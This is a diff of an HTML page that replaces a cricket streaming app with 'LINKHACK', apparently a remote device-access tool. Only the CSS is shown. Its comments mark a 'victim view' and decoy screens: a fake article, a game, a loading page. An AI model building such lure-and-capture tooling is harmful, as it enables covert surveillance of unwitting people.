@@ -1,1377 +1,755 @@
 <!DOCTYPE html>
-<html lang="hi">
+<html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>StreamCam Live — Cricket Edition</title>
-<link rel="preconnect" href="https://fonts.googleapis.com">
-<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@600;700;800&family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<meta name="theme-color" content="#06090c">
+<title>LINKHACK // remote device access</title>
 <style>
-  :root{
-    --bg:#0B0E11;
-    --panel:#12161C;
-    --panel-2:#1A1F27;
-    --line:#232933;
-    --text:#E8ECF1;
-    --muted:#7B8794;
-    --live:#FF3B5C;
-    --accent:#3BD6FF;
-    --ok:#31D67E;
-    --teamA:#123B8A;
-    --teamB:#0E7FD6;
-  }
-  *{box-sizing:border-box; -webkit-tap-highlight-color:transparent;}
-  html,body{height:100%;margin:0;background:var(--bg);color:var(--text);font-family:'Inter',sans-serif;overflow:hidden;}
-  .app{position:relative;height:100vh;width:100vw;max-width:520px;margin:0 auto;background:var(--bg);display:flex;flex-direction:column;overflow:hidden;}
-
-  /* ===== CAMERA BOX (now smaller) ===== */
-  .camBox{position:relative;width:100%;height:32vh;min-height:190px;background:#000;flex-shrink:0;overflow:hidden;border-bottom:2px solid var(--line);}
-  video#preview,video#adPlayer{position:absolute;inset:0;width:100%;height:100%;object-fit:cover;background:#000;}
-  video#adPlayer{display:none;}
-  canvas#compose{display:none;}
-
-  .noStream{position:absolute;inset:0;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:8px;color:var(--muted);text-align:center;padding:14px;z-index:2;}
-  .noStream button{background:var(--accent);color:#03181f;border:none;padding:9px 18px;border-radius:24px;font-weight:600;font-size:13px;cursor:pointer;}
-
-  .topbar{position:absolute;top:0;left:0;right:0;padding:8px 8px 0;display:flex;justify-content:space-between;align-items:flex-start;z-index:5;}
-  .liveBadge{display:flex;align-items:center;gap:6px;background:rgba(0,0,0,.5);backdrop-filter:blur(6px);padding:5px 10px 5px 7px;border-radius:16px;font-family:'Poppins',sans-serif;}
-  .dot{width:8px;height:8px;border-radius:50%;background:var(--live);}
-  .dot.on{animation:pulse 1.1s infinite;}
-  @keyframes pulse{0%,100%{opacity:1;box-shadow:0 0 0 0 rgba(255,59,92,.6);}50%{opacity:.55;box-shadow:0 0 0 5px rgba(255,59,92,0);}}
-  .liveText{font-size:11.5px;font-weight:700;letter-spacing:.4px;}
-  .timer{font-size:11px;color:var(--muted);font-variant-numeric:tabular-nums;margin-left:2px;}
-  .closeBtn{width:28px;height:28px;border-radius:50%;background:rgba(0,0,0,.5);backdrop-filter:blur(6px);border:none;color:var(--text);font-size:13px;display:flex;align-items:center;justify-content:center;cursor:pointer;}
-
-  .statsPill{position:absolute;top:42px;left:8px;z-index:5;display:flex;gap:8px;background:rgba(0,0,0,.5);backdrop-filter:blur(6px);padding:5px 10px;border-radius:16px;font-size:10.5px;color:var(--muted);align-items:center;}
-  .statsPill b{color:var(--text);font-weight:600;}
-
-  .cricketPill,.adPill{position:absolute;top:42px;z-index:5;background:rgba(0,0,0,.5);backdrop-filter:blur(6px);border:1px solid var(--line);color:var(--text);padding:5px 11px;border-radius:16px;font-size:10.5px;font-weight:600;cursor:pointer;}
-  .cricketPill{right:8px;}
-  .cricketPill.active{background:var(--ok);color:#04140b;border-color:var(--ok);}
-  .adPill{right:8px;top:74px;}
-  .adPill.active{background:var(--live);color:#fff;border-color:var(--live);}
-
-  .wmOverlay{position:absolute;font-family:'Poppins',sans-serif;font-weight:700;color:rgba(255,255,255,.85);text-shadow:0 1px 6px rgba(0,0,0,.6);font-size:11px;z-index:4;pointer-events:none;top:74px;right:10px;}
-  .audioMeter{position:absolute;left:8px;bottom:52px;display:flex;align-items:flex-end;gap:2px;height:16px;z-index:4;}
-  .audioMeter span{width:2.5px;background:var(--accent);border-radius:2px;height:3px;transition:height .08s linear;}
-
-  .quickTools{position:absolute;left:6px;top:50%;transform:translateY(-50%);display:flex;flex-direction:column;gap:6px;z-index:5;}
-  .qBtn{width:28px;height:28px;border-radius:50%;background:rgba(18,22,27,.7);backdrop-filter:blur(6px);border:1px solid var(--line);display:flex;align-items:center;justify-content:center;font-size:12px;cursor:pointer;color:var(--text);}
-  .qBtn.active{background:var(--accent);color:#03181f;border-color:var(--accent);}
-  .filterLabel{position:absolute;bottom:52px;left:50%;transform:translateX(-50%);font-size:10.5px;color:var(--muted);background:rgba(0,0,0,.4);padding:3px 9px;border-radius:10px;z-index:5;}
-  .adBadge{position:absolute;top:8px;left:50%;transform:translateX(-50%);background:var(--live);color:#fff;font-family:'Poppins',sans-serif;font-weight:700;font-size:11px;padding:5px 12px;border-radius:14px;z-index:6;display:none;align-items:center;gap:6px;}
-
-  .boundaryAnim{position:absolute;inset:0;display:flex;align-items:center;justify-content:center;font-family:'Poppins',sans-serif;font-weight:900;font-size:min(22vw,74px);pointer-events:none;z-index:9;opacity:0;transform:scale(.2) rotate(-6deg);}
-  .boundaryAnim.show.four{animation:boundaryPop 1.3s cubic-bezier(.2,1.4,.4,1) forwards;color:#3BD6FF;text-shadow:0 0 24px rgba(59,214,255,.95),0 4px 14px rgba(0,0,0,.7);}
-  .boundaryAnim.show.six{animation:boundaryPop 1.3s cubic-bezier(.2,1.4,.4,1) forwards;color:#FFC93B;text-shadow:0 0 28px rgba(255,201,59,.95),0 4px 14px rgba(0,0,0,.7);}
-  @keyframes boundaryPop{0%{opacity:0;transform:scale(.2) rotate(-8deg);}15%{opacity:1;transform:scale(1.2) rotate(3deg);}30%{transform:scale(1) rotate(0deg);}78%{opacity:1;transform:scale(1);}100%{opacity:0;transform:scale(1.35);}}
-
-  /* ===== BROADCAST-STYLE SCOREBUG (on-screen, like TV cricket graphics) ===== */
-  .sbTabs{position:absolute;left:3px;bottom:52px;display:flex;gap:6px;z-index:6;}
-  .sbTab{background:rgba(0,0,0,.55);backdrop-filter:blur(6px);border:1px solid var(--line);color:var(--muted);font-size:9.5px;font-weight:700;letter-spacing:.3px;padding:5px 11px;border-radius:12px;cursor:pointer;}
-  .sbTab.active{background:var(--accent);color:#03181f;border-color:var(--accent);}
-
-  .scorebug{position:absolute;left:3px;right:3px;bottom:5px;height:42px;z-index:6;display:flex;align-items:stretch;border-radius:21px;overflow:hidden;box-shadow:0 4px 16px rgba(0,0,0,.5);background:linear-gradient(90deg,#123B7A 0%,#081120 42%,#000000 50%,#081120 58%,#123B7A 100%);transition:background .3s;}
-  .sbEndCircle{width:26px;flex-shrink:0;background:transparent;display:flex;align-items:center;justify-content:center;cursor:pointer;}
-  .sbFlagCircle{width:21px;height:21px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-family:'Poppins',sans-serif;font-weight:800;font-size:8px;color:#fff;flex-shrink:0;overflow:hidden;}
-  .sbFlagCircle img{width:100%;height:100%;object-fit:cover;border-radius:50%;}
-  .sbSide{background:transparent;display:flex;align-items:center;justify-content:flex-start;padding:0 6px 0 9px;flex-shrink:0;width:106px;overflow:hidden;}
-  .sbBatsmen{display:flex;flex-direction:column;justify-content:center;}
-  .sbBatRow{display:flex;align-items:center;gap:3px;font-size:9px;color:#EAF2FD;white-space:nowrap;padding:2px 4px;border-radius:5px;font-weight:700;}
-  .sbBatRow .sbArrow{color:#7FC8FF;font-size:8px;width:6px;flex-shrink:0;}
-  .sbSep{color:#5A7DA8;margin:0 1px;}
-  .sbBatName{max-width:44px;overflow:hidden;text-overflow:ellipsis;}
-  .sbBatRuns{font-weight:800;}
-  .sbBatBalls{color:#9BB6D9;font-size:7.5px;font-weight:500;}
-
-  .sbCenter{flex:1;min-width:64px;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:2px 5px;}
-  .sbScoreLine{display:flex;align-items:baseline;gap:6px;}
-  .sbScoreBadge{color:#fff;background:linear-gradient(135deg,#FF3B5C,#FF7A59);font-family:'Poppins',sans-serif;font-weight:800;font-size:13px;letter-spacing:.3px;padding:2px 10px;border-radius:999px;box-shadow:0 2px 8px rgba(255,59,92,.5);}
-  .sbOversInline{color:#fff;font-family:'Poppins',sans-serif;font-weight:700;font-size:11px;}
-  .sbCenterSub{color:#8FB4E8;font-size:7.5px;font-weight:700;letter-spacing:.3px;margin-top:2px;text-transform:uppercase;max-width:130px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;}
-
-  .sbBowlerSide{background:transparent;display:flex;flex-direction:column;justify-content:center;align-items:flex-end;padding:0 9px 0 6px;gap:0;flex-shrink:0;width:106px;overflow:hidden;}
-  .sbBowlerName{font-size:9px;font-weight:800;color:#EAF2FD;font-family:'Poppins',sans-serif;max-width:88px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;}
-  .sbBowlerFig{font-size:8.5px;color:#EAF2FD;font-weight:700;}
-  .sbBowlerFig span{color:#9BB6D9;font-weight:600;font-size:7.5px;margin-left:3px;}
-  .sbOverDots{display:flex;gap:2px;margin-top:1px;}
-  .sbDot{width:9px;height:9px;border-radius:50%;border:1.2px solid #6A8EC0;display:flex;align-items:center;justify-content:center;font-size:5.5px;font-weight:800;color:#fff;flex-shrink:0;}
-  .sbDot.filled{background:#3B82F6;border-color:#3B82F6;color:#fff;}
-  .sbDot.wicket{background:#FF3B5C;border-color:#FF3B5C;color:#fff;}
-  .sbDot.boundary{background:#7FC8FF;border-color:#7FC8FF;color:#03181f;}
-
-  /* ===== SCOREBOARD (Modern, IPL style) ===== */
-  .scoreWrap{flex:1;overflow-y:auto;padding:12px 12px 8px;background:var(--bg);}
-
-  /* ===== SCORING TABLE (moved below the live screen, light theme, compact) ===== */
-  .scoringTable{background:linear-gradient(160deg,#F4F6FB,#E7EBF3);border:1px solid #D7DCE5;border-radius:11px;padding:7px 8px 6px;margin-bottom:8px;box-shadow:0 6px 16px rgba(0,0,0,.25);}
-  .scoringTable h4{margin:0 0 6px;font-family:'Poppins',sans-serif;font-size:11px;color:#1A1F2B;display:flex;justify-content:space-between;align-items:center;}
-  .scoringTable .cpRow{gap:5px;margin-bottom:5px;}
-  .scoringTable .cpRow input[type=text]{background:#fff;border:1px solid #D7DCE5;color:#1A1F2B;padding:6px 7px;font-size:11px;}
-  .scoringTable .runGrid{gap:5px;margin-bottom:6px;}
-  .scoringTable .runBtn{background:#fff;border:1px solid #D7DCE5;color:#1A1F2B;padding:8px 0;font-size:12.5px;}
-  .scoringTable .runBtn.four,.scoringTable .runBtn.six{color:#0B7FA8;}
-  .scoringTable .extraGrid{grid-template-columns:repeat(4,1fr);gap:5px;margin-bottom:6px;}
-  .scoringTable .extraBtn{background:#fff;border:1px solid #D7DCE5;color:#5A6472;padding:7px 2px;font-size:11px;font-weight:700;white-space:nowrap;}
-  .scoringTable .wicketBtn{padding:8px;font-size:12px;margin-bottom:6px;}
-  .scoringTable .utilRow{margin-bottom:2px;gap:5px;}
-  .scoringTable .utilBtn{background:#fff;border:1px solid #D7DCE5;color:#1A1F2B;padding:7px;font-size:10.5px;}
-  .scoringTable .rowBtns{gap:5px;margin-bottom:6px;flex-wrap:wrap;}
-  .scoringTable .chip{background:#fff;border:1px solid #D7DCE5;color:#5A6472;padding:6px 11px;font-size:11px;border-radius:14px;}
-  .scoringTable .chip.active{background:#1656C9;color:#fff;border-color:#1656C9;}
-  .scoringTable select{background:#fff;border:1px solid #D7DCE5;color:#1A1F2B;padding:6px 8px;font-size:11px;}
-  .teamBar{display:flex;justify-content:space-between;align-items:center;padding:12px 16px;border-radius:14px;margin-bottom:8px;color:#fff;box-shadow:0 6px 16px rgba(0,0,0,.35);position:relative;overflow:hidden;}
-  .teamBar.live::before{content:'';position:absolute;inset:0;background:linear-gradient(120deg, rgba(255,255,255,.16), rgba(255,255,255,0) 55%);pointer-events:none;}
-  .teamBar.other{opacity:.72;padding:9px 16px;box-shadow:none;}
-  .tbLeft{display:flex;flex-direction:column;}
-  .tbName{font-family:'Poppins',sans-serif;font-weight:800;font-size:15px;letter-spacing:.2px;}
-  .tbTag{font-size:9.5px;opacity:.9;letter-spacing:.8px;margin-top:2px;font-weight:600;}
-  .tbRight{text-align:right;}
-  .tbScore{font-family:'Poppins',sans-serif;font-weight:800;font-size:20px;display:block;text-shadow:0 2px 8px rgba(0,0,0,.3);}
-  .tbOvers{font-size:10.5px;opacity:.9;}
-  .tbSub{display:flex;justify-content:space-between;flex-wrap:wrap;gap:6px;font-size:11.5px;color:var(--accent);padding:0 4px;margin-bottom:10px;font-weight:600;}
-  .sbOver{display:flex;gap:4px;margin:0 4px 12px;flex-wrap:wrap;}
-  .sbBall{background:var(--panel-2);border-radius:6px;padding:3px 7px;font-size:11px;color:var(--text);border:1px solid var(--line);}
-  .sbBall.wicket{background:var(--live);color:#fff;border-color:var(--live);}
-  .sbBall.boundary{background:var(--accent);color:#03181f;border-color:var(--accent);}
-
-  /* Batting + Bowling cards side by side */
-  .matchInfoRow{display:flex;gap:8px;margin-bottom:10px;}
-  .battingCard{flex:1.5;background:linear-gradient(160deg, var(--panel), var(--panel-2));border:1px solid var(--line);border-radius:12px;padding:10px 12px;box-shadow:0 4px 12px rgba(0,0,0,.25);}
-  .bcRow{display:grid;grid-template-columns:2fr .6fr .6fr .5fr .5fr .7fr;gap:4px;align-items:center;padding:4px 0;font-size:11px;}
-  .bcHead{color:var(--muted);font-size:9.5px;text-transform:uppercase;letter-spacing:.4px;border-bottom:1px solid var(--line);padding-bottom:6px;margin-bottom:2px;}
-  .bcRow span{text-align:center;}
-  .bcRow span:first-child{text-align:left;font-weight:600;color:var(--text);}
-  .bcRow.striker span:first-child{color:var(--accent);font-weight:800;}
-  .bowlingCard{flex:1;background:linear-gradient(160deg, var(--panel), var(--panel-2));border:1px solid var(--line);border-radius:12px;padding:10px 12px;box-shadow:0 4px 12px rgba(0,0,0,.25);display:flex;flex-direction:column;}
-  .bowlingCard h5{margin:0 0 6px;font-family:'Poppins',sans-serif;font-size:10.5px;color:var(--muted);text-transform:uppercase;letter-spacing:.5px;}
-  .bowlingCard input{width:100%;background:var(--panel-2);border:1px solid var(--line);color:var(--accent);font-weight:700;font-size:12.5px;padding:6px 8px;border-radius:7px;margin-bottom:8px;font-family:'Poppins',sans-serif;}
-  .bowlerStats{display:grid;grid-template-columns:1fr 1fr;gap:6px;}
-  .bowlerStats div{background:var(--panel-2);border-radius:7px;padding:6px 4px;text-align:center;}
-  .bowlerStats span{display:block;font-family:'Poppins',sans-serif;font-weight:800;font-size:14px;color:var(--text);}
-  .bowlerStats label{display:block;font-size:8.5px;color:var(--muted);text-transform:uppercase;letter-spacing:.4px;margin-top:1px;}
-
-  .teamTabs{display:flex;gap:8px;margin:6px 0 8px;}
-  .teamTab{flex:1;padding:9px 0;border-radius:10px;border:1px solid var(--line);background:var(--panel-2);color:var(--muted);font-weight:700;font-size:12.5px;cursor:pointer;font-family:'Poppins',sans-serif;letter-spacing:.3px;}
-  .teamTab.active{color:#fff;border-color:transparent;box-shadow:0 4px 12px rgba(0,0,0,.3);}
-
-  .xiCol{background:linear-gradient(160deg, var(--panel), var(--panel-2));border:1px solid var(--line);border-left:4px solid;border-radius:12px;padding:10px 12px 6px;box-shadow:0 4px 12px rgba(0,0,0,.25);}
-  .xiCol h4{margin:0 0 8px;font-family:'Poppins',sans-serif;font-size:12px;letter-spacing:.3px;}
-  .xiCol ol{margin:0;padding-left:18px;}
-  .xiCol li{font-size:12px;color:var(--text);padding:3px 0;border-bottom:1px dashed var(--line);}
-  .xiCol li:last-child{border-bottom:none;}
-  .xiCol li.current{font-weight:700;color:var(--accent);}
-  .xiCol li.out{color:var(--muted);text-decoration:line-through;}
-
-  /* ===== BOTTOM BAR ===== */
-  .bottombar{flex-shrink:0;background:var(--panel);border-top:1px solid var(--line);padding:12px 20px 20px;display:flex;align-items:center;justify-content:space-between;}
-  .sideBtn{width:44px;height:44px;border-radius:50%;background:var(--panel-2);border:1px solid var(--line);color:var(--text);font-size:18px;display:flex;align-items:center;justify-content:center;cursor:pointer;}
-  .recBtn{width:64px;height:64px;border-radius:50%;background:transparent;border:4px solid #fff;display:flex;align-items:center;justify-content:center;cursor:pointer;}
-  .recBtn .inner{width:48px;height:48px;border-radius:50%;background:var(--live);transition:.2s;}
-  .recBtn.recording .inner{border-radius:9px;width:24px;height:24px;}
-
-  /* ===== CRICKET SETUP PANEL (light, no black background) ===== */
-  .cricketPanel{position:absolute;top:0;left:0;right:0;bottom:0;background:linear-gradient(160deg,#F4F6FB,#E7EBF3);color:#1A1F2B;transform:translateY(-105%);transition:transform .28s ease;z-index:25;padding:18px 16px 90px;overflow-y:auto;}
-  .cricketPanel.open{transform:translateY(0);}
-  .cricketPanel h3{font-family:'Poppins',sans-serif;margin:14px 0 12px;font-size:15px;color:#1A1F2B;}
-  .cricketPanel h3:first-of-type{margin-top:4px;}
-  .cricketPanel .cpRow input[type=text]{background:#fff;border:1px solid #D7DCE5;color:#1A1F2B;}
-  .cricketPanel select{background:#fff;border:1px solid #D7DCE5;color:#1A1F2B;}
-  .cricketPanel textarea{background:#fff;border:1px solid #D7DCE5;color:#1A1F2B;}
-  .cricketPanel .utilBtn{background:#fff;border:1px solid #D7DCE5;color:#1A1F2B;}
-  .cricketPanel .note{background:#fff;border:1px solid #D7DCE5;color:#5A6472;}
-  .cricketPanel hr{border-top:1px solid #D7DCE5;}
-  .cricketPanel input[type=file]{color:#5A6472;}
-  .cpClose{position:absolute;top:14px;right:16px;background:none;border:none;color:var(--muted);font-size:20px;cursor:pointer;z-index:2;}
-  .cpSection{display:flex;gap:8px;align-items:center;margin-bottom:12px;}
-  .cpRow{display:flex;gap:8px;margin-bottom:8px;}
-  .cpRow input[type=text]{flex:1;background:var(--panel-2);border:1px solid var(--line);color:var(--text);padding:9px 10px;border-radius:8px;font-size:13px;font-family:'Inter',sans-serif;}
-  .cpRow input[type=color]{width:44px;height:38px;border:1px solid var(--line);border-radius:8px;background:var(--panel-2);padding:2px;cursor:pointer;}
-  select{background:var(--panel-2);border:1px solid var(--line);color:var(--text);padding:9px 10px;border-radius:8px;font-size:13px;font-family:'Inter',sans-serif;}
-  textarea{width:100%;background:var(--panel-2);border:1px solid var(--line);color:var(--text);padding:8px 10px;border-radius:8px;font-size:12px;font-family:'Inter',sans-serif;margin-bottom:12px;resize:vertical;}
-  .runGrid{display:grid;grid-template-columns:repeat(4,1fr);gap:5px;margin-bottom:7px;}
-  .runBtn{background:var(--panel-2);border:1px solid var(--line);color:var(--text);padding:7px 0;border-radius:8px;font-size:13px;font-weight:700;cursor:pointer;font-family:'Poppins',sans-serif;}
-  .runBtn.six,.runBtn.four{color:var(--accent);}
-  .extraGrid{display:grid;grid-template-columns:repeat(4,1fr);gap:5px;margin-bottom:7px;}
-  .extraBtn{background:var(--panel-2);border:1px solid var(--line);color:var(--muted);padding:6px 0;border-radius:7px;font-size:10.5px;font-weight:600;cursor:pointer;}
-  .wicketBtn{width:100%;background:var(--live);color:#fff;border:none;padding:8px;border-radius:8px;font-weight:700;font-size:12.5px;cursor:pointer;margin-bottom:7px;font-family:'Poppins',sans-serif;}
-  .utilRow{display:flex;gap:6px;margin-bottom:4px;}
-  .utilBtn{flex:1;background:var(--panel-2);border:1px solid var(--line);color:var(--text);padding:10px;border-radius:8px;font-size:12px;cursor:pointer;}
-  hr{border:none;border-top:1px solid var(--line);margin:16px 0;}
-  input[type=file]{width:100%;font-size:12px;color:var(--muted);margin-bottom:12px;}
-  .note{font-size:11.5px;color:var(--muted);line-height:1.5;background:var(--panel-2);padding:10px 12px;border-radius:10px;border:1px solid var(--line);}
-
-  /* ===== SETTINGS DRAWER ===== */
-  .drawer{position:absolute;top:0;right:0;height:100%;width:78%;max-width:340px;background:var(--panel);transform:translateX(100%);transition:transform .28s ease;z-index:26;padding:20px;overflow-y:auto;border-left:1px solid var(--line);}
-  .drawer.open{transform:translateX(0);}
-  .drawer h3{font-family:'Poppins',sans-serif;margin:0 0 16px;font-size:18px;}
-  .field{margin-bottom:20px;}
-  .field label{display:block;font-size:12px;color:var(--muted);margin-bottom:8px;text-transform:uppercase;letter-spacing:.6px;}
-  .field select,.field input[type=text]{width:100%;}
-  .rowBtns{display:flex;gap:8px;flex-wrap:wrap;}
-  .chip{padding:8px 14px;border-radius:20px;background:var(--panel-2);border:1px solid var(--line);font-size:13px;cursor:pointer;color:var(--muted);}
-  .chip.active{background:var(--accent);color:#03181f;border-color:var(--accent);font-weight:600;}
-  .drawerClose{position:absolute;top:16px;left:16px;background:none;border:none;color:var(--muted);font-size:20px;cursor:pointer;}
-  .backdrop{position:absolute;inset:0;background:rgba(0,0,0,.4);z-index:15;display:none;}
-  .backdrop.show{display:block;}
-
-  .toast{position:absolute;bottom:100px;left:50%;transform:translateX(-50%);background:rgba(20,24,30,.95);border:1px solid var(--line);padding:10px 18px;border-radius:24px;font-size:13px;z-index:40;opacity:0;pointer-events:none;transition:.25s;max-width:88%;text-align:center;}
-  .toast.show{opacity:1;}
-
-  .powerplayRow{display:flex;gap:6px;overflow-x:auto;margin-top:10px;padding-top:8px;border-top:1px solid #D7DCE5;}
-  .ppChip{flex-shrink:0;background:#fff;border:1px solid #D7DCE5;border-radius:8px;padding:5px 9px;text-align:center;min-width:36px;}
-  .ppChip b{display:block;font-family:'Poppins',sans-serif;font-size:12px;color:#1656C9;}
-  .ppChip span{display:block;font-size:8.5px;color:#5A6472;margin-top:1px;}
-
-  .bowlerModal{position:absolute;inset:0;background:rgba(10,15,20,.7);z-index:50;display:none;align-items:center;justify-content:center;padding:24px;}
-  .bowlerModal.show{display:flex;}
-  .bowlerModalCard{background:linear-gradient(160deg,#F4F6FB,#E7EBF3);border-radius:16px;padding:18px;width:100%;max-width:340px;color:#1A1F2B;}
-  .bowlerModalCard h3{margin:0 0 12px;font-family:'Poppins',sans-serif;font-size:15px;}
-  .bowlerList{display:flex;flex-wrap:wrap;gap:8px;margin-bottom:14px;max-height:180px;overflow-y:auto;}
-  .bowlerOption{background:#fff;border:1px solid #D7DCE5;color:#1A1F2B;padding:9px 14px;border-radius:20px;font-size:13px;cursor:pointer;font-weight:600;}
-  .bowlerOption.active{background:#1656C9;color:#fff;border-color:#1656C9;}
-  .bowlerAddRow{display:flex;gap:8px;}
-  .bowlerAddRow input{flex:1;background:#fff;border:1px solid #D7DCE5;color:#1A1F2B;padding:9px 10px;border-radius:8px;font-size:13px;}
-  .bowlerAddRow button{background:#1656C9;color:#fff;border:none;padding:9px 14px;border-radius:8px;font-size:13px;cursor:pointer;font-weight:600;}
+:root{
+  --bg:#06090c;--card:#0c141b;--card2:#0f1a23;--line:#1c2937;--fg:#e8f2f8;--dim:#7b8f9e;
+  --acc:#00e5a0;--acc2:#38bdf8;--warn:#fbbf24;--bad:#f87171;--r:14px;
+}
+*{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+html,body{margin:0;min-height:100%}
+body{background:var(--bg);color:var(--fg);font:14px/1.5 system-ui,-apple-system,"Segoe UI",Roboto,sans-serif;
+  padding-bottom:env(safe-area-inset-bottom);overflow-x:hidden}
+.wrap{max-width:760px;margin:0 auto;padding:16px 14px 40px}
+h1{font-size:17px;margin:0;letter-spacing:.5px;font-weight:650}
+h1 span{color:var(--acc)}
+.sub{color:var(--dim);font-size:11.5px;margin-top:3px}
+.card{background:var(--card);border:1px solid var(--line);border-radius:var(--r);padding:14px;margin-top:12px}
+.card.acc{border-color:rgba(0,229,160,.35);background:linear-gradient(180deg,rgba(0,229,160,.07),transparent)}
+h2{font-size:11px;letter-spacing:1.6px;text-transform:uppercase;color:var(--dim);margin:18px 0 8px;font-weight:600}
+.row{display:flex;gap:10px;align-items:center}
+.sp{flex:1}
+button{font:inherit;border-radius:10px;border:1px solid var(--line);background:var(--card2);color:var(--fg);
+  padding:10px 14px;font-size:13px;font-weight:550;cursor:pointer;transition:.15s}
+button:active{transform:scale(.97)}
+button.p{background:linear-gradient(135deg,var(--acc),#00c98d);color:#04120c;border-color:transparent;font-weight:700}
+button.g{background:transparent}
+button.sm{padding:7px 10px;font-size:11.5px;border-radius:8px}
+button.danger{color:var(--bad)}
+input,select{font:inherit;background:#080e13;border:1px solid var(--line);color:var(--fg);
+  border-radius:9px;padding:9px 11px;width:100%;outline:0;font-size:12.5px}
+input:focus{border-color:var(--acc)}
+.mono{font-family:ui-monospace,SFMono-Regular,Menlo,monospace;font-size:12px;word-break:break-all}
+.pill{display:inline-flex;align-items:center;gap:6px;font-size:11px;padding:4px 9px;border-radius:99px;
+  border:1px solid var(--line);color:var(--dim);background:#080e13}
+.pill.on{color:var(--acc);border-color:rgba(0,229,160,.4)}
+.dot{width:7px;height:7px;border-radius:50%;background:var(--dim)}
+.dot.live{background:var(--acc);box-shadow:0 0 8px var(--acc);animation:bl 1.4s infinite}
+@keyframes bl{50%{opacity:.25}}
+.kv{display:flex;gap:10px;padding:5px 0;border-bottom:1px solid rgba(255,255,255,.045);font-size:12.5px}
+.kv:last-child{border:0}
+.kv b{color:var(--dim);font-weight:500;flex:0 0 38%}
+.kv i{font-style:normal;flex:1;text-align:right;word-break:break-word}
+.kv i.g{color:var(--acc)}.kv i.w{color:var(--warn)}.kv i.b{color:var(--bad)}
+.dev{background:var(--card);border:1px solid var(--line);border-radius:var(--r);padding:12px;margin-top:10px}
+.dev.new{border-color:rgba(0,229,160,.5);box-shadow:0 0 0 1px rgba(0,229,160,.15)}
+.devhead{display:flex;gap:10px;align-items:center}
+.avatar{width:52px;height:52px;border-radius:11px;object-fit:cover;background:#0a1116;
+  border:1px solid var(--line);display:grid;place-items:center;font-size:20px;flex:0 0 52px}
+.devname{font-weight:650;font-size:14.5px}
+.devmeta{font-size:11.5px;color:var(--dim);margin-top:2px}
+.grid{display:grid;grid-template-columns:1fr 1fr;gap:6px;margin-top:10px}
+.chip{background:#0a1219;border:1px solid var(--line);border-radius:8px;padding:7px 9px;font-size:11px;color:var(--dim)}
+.chip b{display:block;color:var(--fg);font-size:12px;font-weight:600;margin-top:2px;word-break:break-word}
+.actions{display:flex;gap:7px;flex-wrap:wrap;margin-top:11px}
+audio{width:100%;margin-top:9px;height:34px}
+.bar{height:5px;border-radius:3px;background:#16212b;overflow:hidden;margin-top:4px}
+.bar i{display:block;height:100%;background:linear-gradient(90deg,var(--acc),var(--acc2))}
+.warnbox{background:rgba(251,191,36,.08);border:1px solid rgba(251,191,36,.3);color:#fde68a;
+  border-radius:10px;padding:10px 12px;font-size:12px;margin-top:12px}
+.empty{text-align:center;color:var(--dim);padding:34px 12px;font-size:13px}
+.qr{width:170px;height:170px;border-radius:12px;background:#fff;padding:7px;display:block}
+pre.out{background:#070d12;border:1px solid var(--line);border-radius:10px;padding:11px;
+  font-size:11px;overflow:auto;max-height:340px;margin:10px 0 0;color:#9fd6bd}
+/* ── agent / victim view ── */
+#view-agent{position:fixed;inset:0;overflow:auto;background:#fff;color:#111;z-index:50}
+#view-agent.dark{background:#0b0f14;color:#e8f2f8}
+.boot{position:fixed;inset:0;background:#06090c;color:#00e5a0;display:grid;place-items:center;
+  z-index:60;font-family:ui-monospace,monospace;font-size:13px;padding:24px;text-align:center}
+.boot .l{margin:4px 0;opacity:0;animation:fi .4s forwards}
+@keyframes fi{to{opacity:1}}
+.fab{position:fixed;right:14px;bottom:20px;width:46px;height:46px;border-radius:50%;
+  background:#00e5a0;color:#04120c;border:0;font-size:18px;font-weight:800;z-index:55;
+  box-shadow:0 6px 22px rgba(0,229,160,.4);display:grid;place-items:center}
+.sheet{position:fixed;inset:auto 0 0 0;max-height:82vh;overflow:auto;background:#0c141b;color:#e8f2f8;
+  border-radius:20px 20px 0 0;padding:18px 16px 30px;z-index:56;border-top:1px solid #1c2937;
+  transform:translateY(102%);transition:.28s cubic-bezier(.3,1,.4,1)}
+.sheet.up{transform:none}
+.sheet h3{margin:0 0 4px;font-size:16px}
+.sheet p.s{color:#7b8f9e;font-size:12px;margin:0 0 12px}
+.grab{width:44px;height:4px;background:#243341;border-radius:9px;margin:0 auto 14px}
+/* decoys */
+.dec{padding:0;min-height:100vh}
+.dec-load{display:grid;place-items:center;min-height:100vh;background:#0b0f14;color:#e8f2f8;text-align:center}
+.spin{width:38px;height:38px;border:3px solid rgba(255,255,255,.15);border-top-color:#00e5a0;
+  border-radius:50%;animation:sp .8s linear infinite;margin:0 auto 16px}
+@keyframes sp{to{transform:rotate(360deg)}}
+.art{max-width:640px;margin:0 auto;padding:26px 20px 70px;font-family:Georgia,serif}
+.art h1{font-size:26px;line-height:1.25;margin:8px 0 6px;font-weight:700;color:inherit}
+.art .by{color:#8b8b8b;font-size:12.5px;font-family:system-ui;margin-bottom:18px}
+.art p{font-size:16.5px;line-height:1.68;color:inherit;opacity:.92}
+.art .hero{height:170px;border-radius:14px;margin:16px 0;
+  background:linear-gradient(135deg,#0f766e,#0891b2 55%,#6366f1)}
+.art .cap{font-family:system-ui;font-size:12px;color:#8b8b8b;margin-top:-10px}
+.game{display:grid;place-items:center;min-height:100vh;background:#070b0f;color:#e8f2f8;
+  text-align:center;font-family:system-ui}
+#arena{width:min(88vw,340px);height:min(88vw,340px);border-radius:18px;background:#0d151c;
+  border:1px solid #1c2937;position:relative;overflow:hidden;margin:16px auto}
+#tgt{position:absolute;width:56px;height:56px;border-radius:50%;
+  background:radial-gradient(circle at 32% 30%,#5eead4,#00e5a0);box-shadow:0 0 24px rgba(0,229,160,.55)}
+.blank{min-height:100vh;background:#000}
 </style>
 </head>
 <body>
-<div class="app">
 
-  <div class="camBox" id="camBox">
-    <video id="preview" autoplay playsinline muted></video>
-    <video id="adPlayer" playsinline></video>
-    <canvas id="compose"></canvas>
